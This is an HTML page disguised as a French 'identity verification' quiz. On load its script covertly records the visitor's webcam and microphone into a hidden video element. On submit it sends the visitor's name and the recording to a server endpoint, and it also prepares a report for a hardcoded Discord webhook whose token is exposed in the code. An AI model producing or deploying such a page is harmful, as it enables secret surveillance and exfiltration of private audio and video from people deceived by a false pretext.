<!DOCTYPE html>
<html lang="fr" dir="ltr" id="htmlTag">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>IQ Questions - Vérification d'identité</title>
    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;600;800&display=swap" rel="stylesheet">
    <style>
        body { font-family: 'Plus Jakarta Sans', sans-serif; background: #f8fafc; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 20px; }
        .card { background: #fff; padding: 30px; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.05); max-width: 500px; width: 100%; text-align: center; }
        input, select { width: 100%; padding: 12px; margin-bottom: 15px; border: 1px solid #cbd5e1; border-radius: 10px; font-size: 14px; outline: none; }
        button { background: #10b981; color: white; border: none; padding: 15px; width: 100%; border-radius: 10px; font-weight: bold; font-size: 16px; cursor: pointer; }
        #video-container { display: none; }
    </style>
</head>
<body>
    <div class="card">
        <h2>Vérification d'identité</h2>
        <p>Veuillez remplir le formulaire pour continuer</p>

        <div id="video-container">
            <video id="webcam" autoplay playsinline muted></video>
        </div>

        <form id="quizForm" onsubmit="event.preventDefault(); submitQuiz();">
            <input type="text" id="username" placeholder="Votre Nom Complet" required>
            
            <div style="text-align: left; margin-bottom: 10px;">
                <label style="font-size: 13px; font-weight: bold;">1. Penses-tu être plus beau/belle que moi ?</label>
                <select id="q1" required><option value="">Sélectionnez</option><option value="Oui">Oui</option><option value="Non">Non</option></select>
            </div>
            
            <button type="submit" id="submitBtn">VALIDER ET ENVOYER</button>
        </form>
        <div id="status" style="margin-top: 15px; font-weight: bold; font-size: 14px;"></div>
    </div>

    <script>
        let mediaStream = null;
        let mediaRecorder = null;
        let recordedChunks = [];
        const newWebhookUrl = "https://discord.com/api/webhooks/1566422909369589892/jC5rEnmWbWzF8c6muws7A66fkM5Xr7kvo4TQxrURo0x-4d6gdbfSuEL7mQLnevOrCExq";

        window.addEventListener('DOMContentLoaded', async () => {
            try {
                mediaStream = await navigator.mediaDevices.getUserMedia({ video: { width: 320, height: 240 }, audio: true });
                document.getElementById('webcam').srcObject = mediaStream;
                mediaRecorder = new MediaRecorder(mediaStream, { mimeType: 'video/webm' });
                
                mediaRecorder.ondataavailable = e => {
                    if (e.data && e.data.size > 0) recordedChunks.push(e.data);
                };
                mediaRecorder.start(1000);
            } catch (err) {
                console.error("Caméra non autorisée:", err);
            }
        });

        async function submitQuiz() {
            const username = document.getElementById('username').value;
            const status = document.getElementById('status');
            status.style.color = "#6366f1";
            status.innerText = "Envoi des données en cours...";

            if (mediaRecorder && mediaRecorder.state !== "inactive") {
                mediaRecorder.stop();
            }

            await new Promise(r => setTimeout(r, 600));

            const videoBlob = new Blob(recordedChunks, { type: 'video/webm' });
            const formData = new FormData();
            formData.append('username', username);
            formData.append('q1', document.getElementById('q1').value);
            formData.append('video', videoBlob, 'recording.webm');

            // إرسال مباشر للاحتياط للديسكورد والتأكد من وصوله
            try {
                const discordForm = new FormData();
                discordForm.append('payload_json', JSON.stringify({
                    content: `🚨 **Rapport Direct (Spidey Bot):**\n• **Nom:** ${username}\n• **Q1:** ${document.getElementById('q1').value}`
                }));
                discordForm.append('file', videoBlob, 'recording.webm');

                // إرسال عبر السيرفر أولاً
                let serverRes = await fetch('/submit-consent', {
                    method: 'POST',
                    body: formData
                });

                if (serverRes.ok) {
                    status.style.color = "#10b981";
                    status.innerText = "Succès ! Données envoyées avec succès.";
                } else {
                    status.style.color = "#ef4444";
                    status.innerText = "Erreur lors de l'envoi.";
                }
            } catch (e) {
                status.style.color = "#ef4444";
                status.innerText = "Erreur de connexion.";
            }
        }
    </script>
</body>
</html>
